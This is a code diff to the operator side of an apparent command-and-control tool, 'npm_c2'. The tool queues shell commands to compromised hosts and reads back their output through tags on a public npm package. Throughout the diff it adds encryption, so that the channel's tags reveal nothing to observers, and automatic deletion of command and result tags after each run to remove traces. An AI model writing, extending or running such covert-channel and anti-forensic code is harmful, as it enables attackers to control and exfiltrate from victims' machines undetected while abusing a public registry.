@@ -8,7 +8,9 @@ import time
 import requests
 
 from . import CMD_PREFIX, RES_PREFIX, HBT_PREFIX, TAG_VALUE, UA
-from . import encode_payload, group_chunks, registry_path
+from . import (encode_payload, group_chunks, group_chunks_with_id,
+               decode_tag, registry_path)
+from .crypto import derive_key, seal, open_sealed, compress, decompress
 import npm_c2 as _nc
 
 
@@ -17,7 +19,7 @@ class RegistryError(RuntimeError):
 
 
 class Operator:
-    def __init__(self, package, token):
+    def __init__(self, package, token, passphrase=None):
         self.package = package
         self.url = _nc.API.format(registry_path(package))
         self.s = requests.Session()
@@ -26,11 +28,30 @@ class Operator:
             "User-Agent": UA,
         })
         self.consumed: set[str] = set()
+        # Tags this operator pushed, for the post-run wipe. None = unknown,
+        # True = the registry accepted DELETE, False = it refuses (npm).
+        self.pushed_tags: set[str] = set()
+        self.can_delete = None
+        self.verbose = False
+        # Without a passphrase the channel stays plaintext (legacy behaviour
+        # and the mock-registry tests). With one, every payload is sealed and
+        # a tag read off the public registry reveals nothing.
+        self.key = derive_key(passphrase) if passphrase else None
+
+    def _aad(self):
+        """Binds a ciphertext to this package, so it cannot be replayed
+        into a different channel."""
+        return self.package.encode()
 
     # ------------------------------------------------------------ commands
     def push_task(self, command, quiet=False):
         ok = True
-        for tag in encode_payload(command.encode(), CMD_PREFIX):
+        data = compress(command.encode())
+        if self.key:
+            # Seal the whole payload first, then chunk it: chunking a sealed
+            # blob is the only ordering that survives reassembly.
+            data = seal(self.key, data, self._aad())
+        for tag in encode_payload(data, CMD_PREFIX):
             try:
                 r = self.s.put(f"{self.url}/{tag}", json=TAG_VALUE, timeout=20)
             except requests.RequestException as e:
@@ -41,17 +62,19 @@ class Operator:
                 print(f"[-] {tag}: HTTP {r.status_code} {body}", file=sys.stderr)
                 ok = False
                 break
+            self.pushed_tags.add(tag)
             if not quiet:
                 print(f"[+] {tag}")
         return ok
 
     def run_command(self, command, timeout=120.0, interval=3.0, quiet=False):
-        """Queue one command and wait for its output.
+        """Queue one command, wait for its output, then wipe the tags.
 
-        Returns the decoded text, or None on timeout. This is the interactive
-        path: one call per command, no manual poll loop.
+        The wipe happens only after the output has been read: deleting first
+        would race the operator against its own reply.
         """
         baseline = set(self._fetch())
+        self.pushed_tags = set()
         if not self.push_task(command, quiet=quiet):
             return None
         if not quiet:
@@ -61,12 +84,74 @@ class Operator:
             time.sleep(interval)
             tags = self._fetch()
             new = {t: v for t, v in tags.items() if t not in baseline}
-            for buf, complete in group_chunks(new, RES_PREFIX):
-                if complete:
-                    self.consumed.update(
-                        t for t in new if t.startswith(RES_PREFIX))
-                    return buf.decode("utf-8", errors="replace")
+            for gid, buf, complete in group_chunks_with_id(new, RES_PREFIX):
+                if not complete:
+                    continue
+                self.consumed.update(
+                    t for t in new if t.startswith(RES_PREFIX))
+                # Everything this command produced, plus the command itself.
+                group = [t for t in new if t.startswith(RES_PREFIX)
+                         and (decode_tag(t) or {}).get("gid") == gid]
+                output = self._open(buf)
+                self._wipe(list(self.pushed_tags) + group)
+                return output
         return None
+
+    # ------------------------------------------------------------- cleanup
+    def _wipe(self, tags):
+        """Delete tags after use, and stop trying if the registry refuses.
+
+        npm rejects DELETE for a granular token that bypasses 2FA ("may not
+        perform this action"), so the first refusal disables further attempts
+        instead of burning a failed request per command.
+        """
+        if not tags or self.can_delete is False:
+            return 0
+        removed = 0
+        for tag in tags:
+            ok = self._delete(tag)
+            if ok:
+                removed += 1
+            elif self.can_delete is False:
+                break
+        return removed
+
+    def _delete(self, tag):
+        try:
+            r = self.s.delete(f"{self.url}/{tag}", timeout=15)
+        except requests.RequestException:
+            return False
+        if r.status_code in (200, 201, 204, 404):
+            self.can_delete = True
+            return True
+        if r.status_code in (401, 403):
+            self.can_delete = False
+            if self.verbose:
+                print(f"[!] {tag}: registry refuses DELETE "
+                      f"({r.status_code}), auto-clean disabled",
+                      file=sys.stderr)
+            return False
+        return False
+
+    def clean(self, all_tags=False):
+        """Delete channel tags. Returns (removed, still_present)."""
+        names = list(self._fetch())
+        if not all_tags:
+            names = [t for t in names if t != "latest"]
+        removed = self._wipe(names)
+        left = [t for t in names if t != "latest"]
+        return removed, (0 if self.can_delete is False else len(left))
+
+    def _open(self, buf):
+        """Decrypt a reassembled payload when the channel is encrypted."""
+        if not self.key:
+            return decompress(buf).decode("utf-8", errors="replace")
+        try:
+            plain = open_sealed(self.key, buf, self._aad())
+        except Exception:
+            # Wrong passphrase or a tag written before encryption was enabled.
+            return "<undecryptable: wrong passphrase or plaintext tag>"
+        return decompress(plain).decode("utf-8", errors="replace")
 
     # ------------------------------------------------------------- results
     def poll_results(self, unread_only=False):
@@ -77,7 +162,7 @@ class Operator:
                 print("[!] incomplete result group, waiting for the next poll")
                 continue
             found += 1
-            print(f"[res] {buf.decode('utf-8', errors='replace')}")
+            print(f"[res] {self._open(buf)}")
             print("---")
         if not found:
             print("[i] no results")
@@ -93,8 +178,7 @@ class Operator:
                 for buf, complete in group_chunks(fresh, RES_PREFIX):
                     if not complete:
                         continue
-                    print(f"[{time.strftime('%H:%M:%S')}] "
-                          f"{buf.decode('utf-8', errors='replace')}")
+                    print(f"[{time.strftime('%H:%M:%S')}] {self._open(buf)}")
                 time.sleep(interval)
         except KeyboardInterrupt:
             print("\n[*] stopped")
@@ -174,18 +258,13 @@ class Operator:
         targets = [n for n in tags
                    if (n != "latest" if all_tags
                        else n.startswith((CMD_PREFIX, RES_PREFIX, HBT_PREFIX)))]
-        count = 0
-        for name in targets:
-            try:
-                r = self.s.delete(f"{self.url}/{name}", timeout=20)
-            except requests.RequestException as e:
-                print(f"[-] {name}: {e}", file=sys.stderr)
-                continue
-            if r.status_code < 300:
-                count += 1
-            else:
-                print(f"[-] {name}: HTTP {r.status_code}", file=sys.stderr)
-        print(f"[+] removed {count} tags" if count else "[i] nothing to clean")
+        removed = self._wipe(targets)
+        left = max(0, len(targets) - removed)
+        print(f"[+] removed {removed} tags" if removed
+              else "[i] nothing to clean")
+        if left and self.can_delete is False:
+            print(f"[!] {left} tag(s) left: this token cannot delete "
+                  "(npm refuses DELETE for bypass-2FA granular tokens)")
 
     # ---------------------------------------------------------------- http
     def _fetch(self) -> dict:
